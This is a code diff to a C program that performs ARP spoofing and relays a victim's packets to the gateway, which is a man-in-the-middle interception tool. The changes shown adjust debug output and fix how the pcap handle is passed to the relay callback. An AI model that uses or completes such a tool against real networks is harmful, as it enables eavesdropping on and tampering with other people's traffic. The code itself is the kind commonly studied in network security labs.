@@ -119,6 +119,7 @@ int main(int argc, char **argv) {
 
     pthread_create(&thread_id, NULL, send_arp_spoofing_packet_thread, &pcd);
     pthread_create(&thread_relay_id, NULL, relay_packet_thread, &pcd);
+    printf("[*] Relay Packet to Gateway..");
     pthread_join(thread_id, NULL);
     pthread_join(thread_relay_id, NULL);
     /*
@@ -209,7 +210,7 @@ void relaypacket_callback(u_char *pcd, const struct pcap_pkthdr *pkthdr, const u
         /* Ethernet header manipulation for relay~~! */
         for(int i=0; i<ETH_ALEN; i++) eth_header->ether_shost[i] = my_mac_addr[i];
         if(!strcmp(ip_src_str, victim_ip_addr_str) && strcmp(ip_dst_str, my_ip) != 0) {
-            printf("[*] manipulation~!!\n");
+            //printf("[*] manipulation~!!\n");
             for(int i=0; i<ETH_ALEN; i++) eth_header->ether_dhost[i] = gateway_mac_addr[i];
             if (pcap_sendpacket((pcap_t *)pcd, packet, pkthdr->len) != 0)
             { fprintf(stderr,"\nError sending the packet: \n", pcap_geterr((pcap_t *)pcd));}
@@ -284,8 +285,7 @@ void *relay_packet_thread(void *useless) {
     if(pcap_compile(pcd, &fp, "", 0, netp) == -1) { printf("compile error\n"); exit(1); }
     if(pcap_setfilter(pcd, &fp) == -1) { printf("setfilter error\n"); exit(0); }
 
-    printf("\n\n[*] Relay Packet to Gateway..");
-    pcap_loop(pcd, 0, relaypacket_callback, NULL);
+    pcap_loop(pcd, 0, relaypacket_callback, (u_char *)pcd);
 
     return 0;
 }
